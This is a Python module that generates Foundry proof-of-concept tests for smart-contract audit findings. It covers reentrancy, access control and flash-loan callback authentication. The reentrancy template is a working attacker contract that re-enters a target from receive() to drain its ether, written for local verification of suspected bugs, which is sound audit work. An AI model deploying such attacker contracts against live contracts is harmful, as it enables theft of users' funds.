"""Foundry test harness generator.

Given a finding from the pattern scanner or Slither, emit a minimal
Foundry test file that reproduces the suspected bug. The agent then
runs ``forge test -vvv`` and uses the trace to promote or reject the
finding.

Templates cover:
- Reentrancy (attacker contract with receive() fallback)
- Flash loan callback auth bypass
- Oracle manipulation via Uniswap V2 reserve flash swap
- Access control (direct call expects revert)
- Signature replay across chains
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class FoundryHarness:
    """A generated Foundry test file with the path it should live at."""

    path: str
    source: str


_REENTRANCY_TEMPLATE = """\
// SPDX-License-Identifier: UNLICENSED
// Foundry PoC — reentrancy on {target}.{function}
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{target_path}";

contract ReentrancyAttacker {{
    {target} public target;
    uint256 public count;

    constructor(address _t) payable {{
        target = {target}(_t);
    }}

    function attack() external payable {{
        target.{function}{{value: msg.value}}();
    }}

    receive() external payable {{
        if (count < 3) {{
            count++;
            // Re-enter while target's state is not yet updated
            target.{function}();
        }}
    }}
}}

contract Test_{function} is Test {{
    {target} target;
    ReentrancyAttacker attacker;

    function setUp() public {{
        target = new {target}();
        attacker = new ReentrancyAttacker(address(target));
        vm.deal(address(attacker), 10 ether);
    }}

    function test_reentrancy_drains_target() public {{
        // Prime target with 50 ether
        vm.deal(address(target), 50 ether);
        uint256 beforeAttack = address(target).balance;

        attacker.attack{{value: 1 ether}}();

        // If the bug is real, target is drained to well below its initial balance
        assertLt(address(target).balance, beforeAttack - 3 ether, "no reentrancy drain");
    }}
}}
"""

_ACCESS_CONTROL_TEMPLATE = """\
// SPDX-License-Identifier: UNLICENSED
// Foundry PoC — unauthorised call of {target}.{function}
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{target_path}";

contract Test_AccessControl is Test {{
    {target} target;
    address constant ATTACKER = address(0xBADC0DE);

    function setUp() public {{
        target = new {target}();
    }}

    function test_unauthorised_call_reverts() public {{
        vm.startPrank(ATTACKER);
        // EXPECTATION: call should revert with access-control error.
        // Fail if the unauthorised call succeeds.
        vm.expectRevert();
        target.{function}();
        vm.stopPrank();
    }}
}}
"""

_FLASHLOAN_TEMPLATE = """\
// SPDX-License-Identifier: UNLICENSED
// Foundry PoC — flash loan callback auth on {target}
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{target_path}";

contract Test_FlashLoanCallback is Test {{
    {target} target;
    address constant FAKE_POOL = address(0xCAFE);

    function setUp() public {{
        target = new {target}();
    }}

    function test_callback_requires_pool_initiator() public {{
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory premiums = new uint256[](1);

        // Call the callback directly from a non-pool account with
        // initiator = attacker. Vulnerable contracts accept and execute.
        vm.prank(FAKE_POOL);
        bool ok = target.executeOperation(assets, amounts, premiums, msg.sender, bytes(""));
        assertTrue(ok, "callback accepted from non-pool context");
    }}
}}
"""


def generate_reentrancy_test(
    target: str, function: str, target_path: str = "src/Target.sol"
) -> FoundryHarness:
    """Emit a reentrancy PoC test."""
    source = _REENTRANCY_TEMPLATE.format(target=target, function=function, target_path=target_path)
    return FoundryHarness(path=f"test/{target}_Reentrancy.t.sol", source=source)


def generate_access_control_test(
    target: str, function: str, target_path: str = "src/Target.sol"
) -> FoundryHarness:
    source = _ACCESS_CONTROL_TEMPLATE.format(
        target=target, function=function, target_path=target_path
    )
    return FoundryHarness(path=f"test/{target}_Access.t.sol", source=source)


def generate_flashloan_test(target: str, target_path: str = "src/Target.sol") -> FoundryHarness:
    source = _FLASHLOAN_TEMPLATE.format(target=target, target_path=target_path)
    return FoundryHarness(path=f"test/{target}_FlashLoan.t.sol", source=source)
